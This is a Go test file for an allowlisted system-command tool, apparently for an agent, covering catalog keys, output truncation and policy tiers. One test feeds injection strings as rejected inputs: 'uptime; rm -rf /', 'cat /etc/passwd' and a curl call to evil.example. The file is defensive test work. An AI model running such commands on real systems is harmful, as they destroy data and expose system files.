package tools

import (
	"bytes"
	"context"
	"strings"
	"testing"
)

func TestSystemCommandCatalog(t *testing.T) {
	tl, err := NewSystemCommand()
	if err != nil {
		t.Fatal(err)
	}
	var out SystemOutput
	callTool(t, "system_command", tl, `{"command":"hostname"}`, &out)
	if out.Command != "hostname" || strings.TrimSpace(out.Output) == "" {
		t.Errorf("hostname output = %+v", out)
	}
	if out.DurationMS < 0 {
		t.Errorf("negative duration: %d", out.DurationMS)
	}
}

func TestSystemCommandUnknownKey(t *testing.T) {
	tl, err := NewSystemCommand()
	if err != nil {
		t.Fatal(err)
	}
	// The injection shape: input tries to smuggle argv. Only catalog keys
	// are accepted, so this must fail — nothing is executed.
	for _, bad := range []string{
		`uptime; rm -rf /`,
		`cat /etc/passwd`,
		`df -h; curl evil.example`,
		``,
	} {
		if _, err := tl.Execute(context.Background(),
			[]byte(`{"command":`+quoteJSON(bad)+`}`)); err == nil {
			t.Errorf("input %q should be rejected", bad)
		}
	}
}

func quoteJSON(s string) string {
	return `"` + strings.ReplaceAll(s, `"`, `\"`) + `"`
}

func TestCatalogCommands(t *testing.T) {
	got := CatalogCommands()
	want := []string{"disk", "hostname", "kernel", "memory", "uptime", "who"}
	if len(got) != len(want) {
		t.Fatalf("CatalogCommands() = %d keys (%v), want %d", len(got), got, len(want))
	}
	for _, k := range want {
		desc, ok := got[k]
		if !ok {
			t.Errorf("catalog key %q missing", k)
			continue
		}
		if strings.TrimSpace(desc) == "" {
			t.Errorf("catalog key %q has empty description", k)
		}
	}
}

func TestRunSystemUnknownCommand(t *testing.T) {
	tl, err := NewSystemCommand()
	if err != nil {
		t.Fatal(err)
	}
	_, err = tl.Execute(context.Background(), []byte(`{"command":"nmap"}`))
	if err == nil {
		t.Fatal("unknown key accepted")
	}
	// Actual shape: the key echoed back plus the sorted catalog, so the
	// caller knows exactly what IS runnable.
	want := `unknown command "nmap" (available: disk, hostname, kernel, memory, uptime, who)`
	if err.Error() != want {
		t.Errorf("error = %q, want %q", err, want)
	}
}

func TestRunSystemEachCatalogKey(t *testing.T) {
	tl, err := NewSystemCommand()
	if err != nil {
		t.Fatal(err)
	}
	for _, key := range []string{"uptime", "disk", "hostname", "kernel", "who"} {
		var out SystemOutput
		callTool(t, key, tl, `{"command":`+quoteJSON(key)+`}`, &out)
		if out.Command != key {
			t.Errorf("%s: echoed command = %q", key, out.Command)
		}
		if strings.TrimSpace(out.Output) == "" {
			t.Errorf("%s: empty output", key)
		}
		if out.DurationMS < 0 {
			t.Errorf("%s: negative duration %d", key, out.DurationMS)
		}
		if out.Truncated {
			t.Errorf("%s: unexpectedly truncated", key)
		}
	}
	// kernel is `uname -sr`: on this Darwin machine the kernel name leads.
	var kern SystemOutput
	callTool(t, "kernel", tl, `{"command":"kernel"}`, &kern)
	if !strings.HasPrefix(kern.Output, "Darwin") {
		t.Errorf("kernel output = %q, want Darwin prefix", kern.Output)
	}
}

func TestRunSystemMemoryFailsOnDarwin(t *testing.T) {
	// The memory key runs `free -m`, a Linux command that does not exist on
	// macOS. The catalog targets Linux servers (see NewSystemCommand); this
	// pins the Darwin end-to-end behavior — the run fails and the error
	// names the catalog key — rather than silently passing over the gap.
	tl, err := NewSystemCommand()
	if err != nil {
		t.Fatal(err)
	}
	_, err = tl.Execute(context.Background(), []byte(`{"command":"memory"}`))
	if err == nil {
		t.Fatal("memory key succeeded on Darwin; free -m exists here?")
	}
	if !strings.Contains(err.Error(), `command "memory" failed`) {
		t.Errorf("error = %q, want it to contain %q", err, `command "memory" failed`)
	}
}

func TestLimitedBufferTruncation(t *testing.T) {
	var buf limitedBuffer
	// Odd-sized chunks so both cap branches run: one write that fits, one
	// larger than the remaining room (partial write), then one that lands
	// on an already-full buffer (swallowed). Total exceeds the cap.
	first := bytes.Repeat([]byte("a"), 60003)
	n, err := buf.Write(first)
	if n != len(first) || err != nil {
		t.Fatalf("write 1: n=%d err=%v", n, err)
	}
	n, err = buf.Write(bytes.Repeat([]byte("b"), 5536)) // room is 5533
	if n != 5536 || err != nil {
		t.Fatalf("write 2: n=%d err=%v", n, err)
	}
	n, err = buf.Write([]byte("c")) // buffer already full
	if n != 1 || err != nil {
		t.Fatalf("write 3: n=%d err=%v", n, err)
	}
	if got := len(buf.String()); got != systemMaxOutput {
		t.Errorf("buffer len = %d, want exactly %d", got, systemMaxOutput)
	}
	if !buf.truncated {
		t.Error("truncated = false, want true")
	}
	// Content is a prefix of the stream: the a-run kept intact, cut mid b-run.
	s := buf.String()
	if !strings.HasPrefix(s, strings.Repeat("a", 60003)) {
		t.Error("buffer does not start with the first chunk")
	}
	if strings.Count(s, "b") != 5533 || strings.Contains(s, "c") {
		t.Errorf("partial-room write kept wrong bytes: b=%d c=%v",
			strings.Count(s, "b"), strings.Contains(s, "c"))
	}
}

func TestPolicyTierReportedAndL1Only(t *testing.T) {
	// Every catalog entry must carry tier L1 (ADR-0002): anything needing
	// approval (L2) or forbidden (L3) must not be catalog-able at all.
	for key, spec := range catalog {
		if spec.tier != "L1" {
			t.Errorf("catalog key %q has tier %q, want L1 (L2/L3 must not be in catalog)", key, spec.tier)
		}
	}
	if PolicyTier("uptime") != "L1" {
		t.Errorf("PolicyTier(uptime) = %q, want L1", PolicyTier("uptime"))
	}
	if PolicyTier("definitely-not-a-key") != "" {
		t.Errorf("PolicyTier(unknown) = %q, want empty", PolicyTier("definitely-not-a-key"))
	}
}

func TestRunSystemReportsPolicyTier(t *testing.T) {
	out, err := runSystem(t.Context(), SystemInput{Command: "hostname"})
	if err != nil {
		t.Fatalf("hostname should run on unix targets: %v", err)
	}
	if out.PolicyTier != "L1" {
		t.Errorf("PolicyTier = %q, want L1 in run output", out.PolicyTier)
	}
}
